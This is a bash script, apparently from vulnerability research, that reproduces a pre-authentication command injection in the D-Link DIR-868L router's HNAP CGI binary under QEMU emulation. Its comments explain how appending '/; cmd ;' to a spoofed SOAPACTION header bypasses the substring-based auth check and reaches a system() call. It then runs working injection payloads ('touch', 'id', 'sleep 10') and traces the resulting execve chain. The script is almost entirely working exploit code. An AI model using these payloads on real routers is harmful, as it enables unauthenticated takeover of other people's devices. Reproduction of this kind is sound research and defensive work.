#!/bin/bash
# HNAP pre-auth command injection - QEMU user-mode reproduction (VERIFIED WORKING)
# Run as root on the analysis VM. DIR-868L B1 fw 2.01b05 cgibin (hnap entry).
#
#   auth gate : strstr(SOAPACTION, "http://purenetworks.com/HNAP1/GetDeviceSettings")
#               -> substring match, spoofable by appending "/; cmd ;"
#   sink      : system("sh /var/run/<action>.sh > /dev/console")
#               action = SOAPACTION after the LAST '/'  (payload must be slash-free!)
set -u
SQUASH='/home/walnut/Desktop/payload/_DIR868LB1_FW201b05.bin.extracted (2)/squashfs-root'
WORK=/tmp/hnaptest
QEMU='/usr/bin/qemu-arm-static -L '"$SQUASH"   # absolute path: env -i clears PATH

rm -rf "$WORK"; mkdir -p "$WORK"
cp "$SQUASH/htdocs/cgibin" "$WORK/hnap"
chmod +x "$WORK/hnap"
cd "$WORK"

echo "=== [1] BASELINE: normal GetDeviceSettings (no creds, no injection) ==="
rm -f HNAP_PWNED ID_OUT
env -i REQUEST_METHOD=GET SCRIPT_FILENAME=/usr/sbin/hnap REMOTE_ADDR=10.0.0.99 \
    HTTP_SOAPACTION='"http://purenetworks.com/HNAP1/GetDeviceSettings"' \
    timeout 60 $QEMU ./hnap >/dev/null 2>/tmp/base.err
echo "exit=$?"; head -2 /tmp/base.err
[ -e HNAP_PWNED ] && echo "[!] unexpected marker" || echo "[ok] no marker"

echo; echo "=== [2] INJECTION: GetDeviceSettings/; touch HNAP_PWNED; id > ID_OUT; ==="
env -i REQUEST_METHOD=GET SCRIPT_FILENAME=/usr/sbin/hnap REMOTE_ADDR=10.0.0.99 \
    HTTP_SOAPACTION='"http://purenetworks.com/HNAP1/GetDeviceSettings/; touch HNAP_PWNED; id > ID_OUT;"' \
    timeout 60 $QEMU ./hnap >/dev/null 2>&1
echo "marker: $(ls -la HNAP_PWNED 2>/dev/null || echo MISSING)"
echo "id:     $(cat ID_OUT 2>/dev/null || echo MISSING)"

echo; echo "=== [3] TIMING oracle: ; sleep 10; ==="
time env -i REQUEST_METHOD=GET SCRIPT_FILENAME=/usr/sbin/hnap REMOTE_ADDR=10.0.0.99 \
    HTTP_SOAPACTION='"http://purenetworks.com/HNAP1/GetDeviceSettings/; sleep 10;"' \
    timeout 60 $QEMU ./hnap >/dev/null 2>&1

echo; echo "=== [4] STRACE: execve chain ==="
rm -f HNAP_PWNED STRACE.txt
env -i REQUEST_METHOD=GET SCRIPT_FILENAME=/usr/sbin/hnap REMOTE_ADDR=10.0.0.99 \
    HTTP_SOAPACTION='"http://purenetworks.com/HNAP1/GetDeviceSettings/; touch HNAP_PWNED;"' \
    timeout 90 strace -f -e trace=execve -o STRACE.txt $QEMU ./hnap >/dev/null 2>&1
grep execve STRACE.txt | cut -c1-230
